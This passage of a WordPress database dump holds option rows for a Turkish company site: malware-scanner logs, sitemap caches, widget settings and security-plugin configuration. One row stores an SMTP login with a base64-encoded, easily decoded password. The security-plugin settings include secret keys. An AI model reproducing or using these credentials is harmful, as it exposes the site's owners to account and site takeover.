Scan\";s:9:\"microtime\";d:20;s:7:\"percent\";i:100;s:11:\"last_threat\";d:1477778940.2197449;s:6:\"finish\";i:1477778940;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15419","GOTMLS_scan_log/195.142.216.94/1477778955.6805","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"htaccess\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778956;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:810;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477779766.757844;s:6:\"finish\";i:1477779766;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15463","widget_pages","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15464","widget_calendar","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15465","widget_tag_cloud","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15433","smtp_mailer_options","a:8:{s:9:\"smtp_host\";s:14:\"smtp.yandex.ru\";s:9:\"smtp_auth\";s:4:\"true\";s:13:\"smtp_username\";s:18:\"info@ismido.com.tr\";s:13:\"smtp_password\";s:12:\"aXNtaWRvMTIz\";s:18:\"type_of_encryption\";s:3:\"tls\";s:9:\"smtp_port\";s:3:\"587\";s:10:\"from_email\";s:18:\"info@ismido.com.tr\";s:9:\"from_name\";s:7:\"İsmido\";}","yes");
INSERT INTO `cmrfu_options` VALUES("15466","widget_nav_menu","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15467","finished_splitting_shared_terms","1","yes");
INSERT INTO `cmrfu_options` VALUES("15468","site_icon","0","yes");
INSERT INTO `cmrfu_options` VALUES("15469","medium_large_size_w","768","yes");
INSERT INTO `cmrfu_options` VALUES("15470","medium_large_size_h","0","yes");
INSERT INTO `cmrfu_options` VALUES("15476","widget_er_leaf_recent_projects_widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15477","widget_er_leaf_recent_posts_widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15478","widget_recent-posts-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15479","widget_er_leaf_embed_code","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15480","widget_er_leaf_contact_info","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15499","wpseo_sitemap_cache_validator_global","3cCoc","no");
INSERT INTO `cmrfu_options` VALUES("15517","wpseo_sitemap_1_cache_validator","35YLm","no");
INSERT INTO `cmrfu_options` VALUES("15518","wpseo_sitemap_page_cache_validator","64oiy","no");
INSERT INTO `cmrfu_options` VALUES("15523","wpseo_sitemap_category_cache_validator","enZl","no");
INSERT INTO `cmrfu_options` VALUES("15526","wpseo_sitemap_post_cache_validator","35YLo","no");
INSERT INTO `cmrfu_options` VALUES("15869","GOTMLS_scan_log/176.232.0.63/1479324693.9969","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1479324740;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1112;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1479325852.1991961;s:6:\"finish\";i:1479325852;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15714","GOTMLS_scan_log/176.233.124.87/1478538588.1549","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478538588;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:15854;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478554440.2240629;s:6:\"finish\";i:1478554442;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15543","GOTMLS_scan_log/176.233.127.40/1477928531.4918","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:2:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477928532;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:2082;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477930614.3939719;s:6:\"finish\";i:1477930614;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15554","wpseo_sitemap_author_cache_validator","3cDKn","no");
INSERT INTO `cmrfu_options` VALUES("15557","wpseo_sitemap_attachment_cache_validator","6sCi6","no");
INSERT INTO `cmrfu_options` VALUES("16166","wpseo_taxonomy_meta","a:1:{s:18:\"portfolio_category\";a:2:{i:58;a:2:{s:13:\"wpseo_linkdex\";s:1:\"9\";s:19:\"wpseo_content_score\";s:2:\"30\";}i:60;a:2:{s:13:\"wpseo_linkdex\";s:1:\"9\";s:19:\"wpseo_content_score\";s:2:\"30\";}}}","yes");
INSERT INTO `cmrfu_options` VALUES("16170","wpseo_sitemap_186_cache_validator","6xFxP","no");
INSERT INTO `cmrfu_options` VALUES("16178","wpseo_sitemap_nav_menu_cache_validator","vMct","no");
INSERT INTO `cmrfu_options` VALUES("16179","wpseo_sitemap_nav_menu_item_cache_validator","vMcD","no");
INSERT INTO `cmrfu_options` VALUES("16180","wpseo_sitemap_934_cache_validator","6GxAG","no");
INSERT INTO `cmrfu_options` VALUES("16181","wpseo_sitemap_942_cache_validator","6GxAQ","no");
INSERT INTO `cmrfu_options` VALUES("16182","wpseo_sitemap_943_cache_validator","6GxB1","no");
INSERT INTO `cmrfu_options` VALUES("16183","wpseo_sitemap_716_cache_validator","6GFcT","no");
INSERT INTO `cmrfu_options` VALUES("15560","wpseo_sitemap_portfolio_category_cache_validator","3ZGtD","no");
INSERT INTO `cmrfu_options` VALUES("19438","_transient_timeout_yst_sm_category_1:3cCoc_enZl","1489725531","no");
INSERT INTO `cmrfu_options` VALUES("19439","_transient_yst_sm_category_1:3cCoc_enZl","C:24:\"WPSEO_Sitemap_Cache_Data\":471:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:424:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/category/genel/</loc>
		<lastmod>2017-03-10T10:26:01+02:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19440","_transient_timeout_yst_sm_page_1:3cCoc_64oiy","1489733825","no");
INSERT INTO `cmrfu_options` VALUES("19441","_transient_yst_sm_page_1:3cCoc_64oiy","C:24:\"WPSEO_Sitemap_Cache_Data\":8510:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:8462:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/</loc>
		<lastmod>2016-11-22T23:54:47+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/blog/</loc>
		<lastmod>2014-06-02T14:15:14+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/kurumsal/</loc>
		<lastmod>2014-08-29T22:29:35+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/hakkimizda/</loc>
		<lastmod>2016-11-22T23:09:48+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/urunler/</loc>
		<lastmod>2016-11-22T23:19:37+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/iletisim/</loc>
		<lastmod>2016-11-23T00:47:57+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/</loc>
		<lastmod>2017-01-08T21:08:28+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/onay-belgesi-001.jpg</image:loc>
			<image:title><![CDATA[onay belgesi 001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika2-001.jpg</image:loc>
			<image:title><![CDATA[misya sertifika2 001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika-001.jpg</image:loc>
			<image:title><![CDATA[misya sertifika 001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/MARKA-PATENT-I%CC%87SMI%CC%87DO-001.jpg</image:loc>
			<image:title><![CDATA[MARKA PATENT İSMİDO 001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/kay%C4%B1t-belgesi-001.jpg</image:loc>
			<image:title><![CDATA[kayıt belgesi 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/</loc>
		<lastmod>2017-01-25T21:25:38+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/Untitled-1-copy.jpg</image:loc>
			<image:title><![CDATA[Untitled-1 copy]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/pls-stand-1.jpg</image:loc>
			<image:title><![CDATA[pls stand 1]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0003.jpg</image:loc>
			<image:title><![CDATA[IMG-20160323-WA0003]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0002.jpg</image:loc>
			<image:title><![CDATA[IMG-20160323-WA0002]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMAG0375.jpg</image:loc>
			<image:title><![CDATA[IMAG0375]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01391.jpg</image:loc>
			<image:title><![CDATA[DSC01391]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01389.jpg</image:loc>
			<image:title><![CDATA[DSC01389]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/</loc>
		<lastmod>2017-01-25T21:26:36+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0035.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0035]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0034.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0034]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0032.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0032]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0031.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0031]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0030.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0030]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0026.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0026]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0025.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0025]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0024.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0024]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0023.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0023]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0022.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0022]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0021.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0021]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0017.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0017]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0015.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0015]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0012.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0012]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0011.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0011]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0010.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0010]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57242.jpg</image:loc>
			<image:title><![CDATA[D3C57242]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57230.jpg</image:loc>
			<image:title><![CDATA[D3C57230]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57213.jpg</image:loc>
			<image:title><![CDATA[D3C57213]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/26.jpg</image:loc>
			<image:title><![CDATA[26]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/15-001.jpg</image:loc>
			<image:title><![CDATA[15-001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/10.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/10-002.jpg</image:loc>
			<image:title><![CDATA[10-002]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/9-001.jpg</image:loc>
			<image:title><![CDATA[9-001]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/6.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/5.jpg</image:loc>
			<image:title><![CDATA[5]]></image:title>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("15565","wpseo_sitemap_portfolio_cache_validator","35Vtu","no");
INSERT INTO `cmrfu_options` VALUES("15661","wpseo_sitemap_revision_cache_validator","5UHBX","no");
INSERT INTO `cmrfu_options` VALUES("15620","GOTMLS_scan_log/78.135.61.182/1478188580.6514","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478188581;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1504;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478190085.5986559;s:6:\"finish\";i:1478190085;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15876","aiowpsec_db_version","1.8","yes");
INSERT INTO `cmrfu_options` VALUES("15877","aio_wp_security_configs","a:80:{s:19:\"aiowps_enable_debug\";s:0:\"\";s:36:\"aiowps_remove_wp_generator_meta_info\";s:0:\"\";s:25:\"aiowps_prevent_hotlinking\";s:1:\"1\";s:28:\"aiowps_enable_login_lockdown\";s:0:\"\";s:28:\"aiowps_allow_unlock_requests\";s:0:\"\";s:25:\"aiowps_max_login_attempts\";s:1:\"3\";s:24:\"aiowps_retry_time_period\";s:1:\"5\";s:26:\"aiowps_lockout_time_length\";s:2:\"60\";s:28:\"aiowps_set_generic_login_msg\";s:0:\"\";s:26:\"aiowps_enable_email_notify\";s:0:\"\";s:20:\"aiowps_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_enable_forced_logout\";s:0:\"\";s:25:\"aiowps_logout_time_period\";s:2:\"60\";s:39:\"aiowps_enable_invalid_username_lockdown\";s:0:\"\";s:43:\"aiowps_instantly_lockout_specific_usernames\";a:0:{}s:32:\"aiowps_unlock_request_secret_key\";s:20:\"af4wfq0mnfkoa0rg2zyq\";s:26:\"aiowps_enable_whitelisting\";s:0:\"\";s:27:\"aiowps_allowed_ip_addresses\";s:0:\"\";s:27:\"aiowps_enable_login_captcha\";s:1:\"1\";s:34:\"aiowps_enable_custom_login_captcha\";s:1:\"1\";s:25:\"aiowps_captcha_secret_key\";s:20:\"4vzmvskdx651vpprw8k4\";s:42:\"aiowps_enable_manual_registration_approval\";s:0:\"\";s:39:\"aiowps_enable_registration_page_captcha\";s:1:\"1\";s:27:\"aiowps_enable_random_prefix\";s:0:\"\";s:31:\"aiowps_enable_automated_backups\";s:1:\"1\";s:26:\"aiowps_db_backup_frequency\";i:2;s:25:\"aiowps_db_backup_interval\";s:1:\"1\";s:26:\"aiowps_backup_files_stored\";i:2;s:32:\"aiowps_send_backup_email_address\";s:0:\"\";s:27:\"aiowps_backup_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_disable_file_editing\";s:1:\"1\";s:37:\"aiowps_prevent_default_wp_file_access\";s:1:\"1\";s:22:\"aiowps_system_log_file\";s:9:\"error_log\";s:26:\"aiowps_enable_blacklisting\";s:0:\"\";s:26:\"aiowps_banned_ip_addresses\";s:0:\"\";s:28:\"aiowps_enable_basic_firewall\";s:1:\"1\";s:31:\"aiowps_enable_pingback_firewall\";s:1:\"1\";s:38:\"aiowps_disable_xmlrpc_pingback_methods\";s:1:\"1\";s:34:\"aiowps_block_debug_log_file_access\";s:1:\"1\";s:26:\"aiowps_disable_index_views\";s:1:\"1\";s:30:\"aiowps_disable_trace_and_track\";s:1:\"1\";s:28:\"aiowps_forbid_proxy_comments\";s:1:\"1\";s:29:\"aiowps_deny_bad_query_strings\";s:1:\"1\";s:34:\"aiowps_advanced_char_string_filter\";s:1:\"1\";s:25:\"aiowps_enable_5g_firewall\";s:1:\"1\";s:25:\"aiowps_enable_6g_firewall\";s:1:\"1\";s:26:\"aiowps_enable_custom_rules\";s:0:\"\";s:19:\"aiowps_custom_rules\";s:0:\"\";s:25:\"aiowps_enable_404_logging\";s:0:\"\";s:28:\"aiowps_enable_404_IP_lockout\";s:0:\"\";s:30:\"aiowps_404_lockout_time_length\";s:2:\"60\";s:28:\"aiowps_404_lock_redirect_url\";s:16:\"http://127.0.0.1\";s:31:\"aiowps_enable_rename_login_page\";s:0:\"\";s:28:\"aiowps_enable_login_honeypot\";s:0:\"\";s:43:\"aiowps_enable_brute_force_attack_prevention\";s:0:\"\";s:30:\"aiowps_brute_force_secret_word\";s:0:\"\";s:24:\"aiowps_cookie_brute_test\";s:0:\"\";s:44:\"aiowps_cookie_based_brute_force_redirect_url\";s:16:\"http://127.0.0.1\";s:59:\"aiowps_brute_force_attack_prevention_pw_protected_exception\";s:0:\"\";s:51:\"aiowps_brute_force_attack_prevention_ajax_exception\";s:0:\"\";s:19:\"aiowps_site_lockout\";s:0:\"\";s:23:\"aiowps_site_lockout_msg\";s:0:\"\";s:30:\"aiowps_enable_spambot_blocking\";s:0:\"\";s:29:\"aiowps_enable_comment_captcha\";s:0:\"\";s:31:\"aiowps_enable_autoblock_spam_ip\";s:0:\"\";s:33:\"aiowps_spam_ip_min_comments_block\";s:0:\"\";s:32:\"aiowps_enable_automated_fcd_scan\";s:0:\"\";s:25:\"aiowps_fcd_scan_frequency\";s:1:\"4\";s:24:\"aiowps_fcd_scan_interval\";s:1:\"2\";s:28:\"aiowps_fcd_exclude_filetypes\";s:0:\"\";s:24:\"aiowps_fcd_exclude_files\";s:0:\"\";s:26:\"aiowps_send_fcd_scan_email\";s:0:\"\";s:29:\"aiowps_fcd_scan_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_fcds_change_detected\";b:0;s:22:\"aiowps_copy_protection\";s:0:\"\";s:40:\"aiowps_prevent_site_display_inside_frame\";s:0:\"\";s:32:\"aiowps_prevent_users_enumeration\";s:0:\"\";s:28:\"aiowps_block_fake_googlebots\";s:1:\"1\";s:23:\"aiowps_last_backup_time\";s:19:\"2017-03-20 08:05:40\";s:35:\"aiowps_enable_lost_password_captcha\";s:1:\"1\";}","yes");
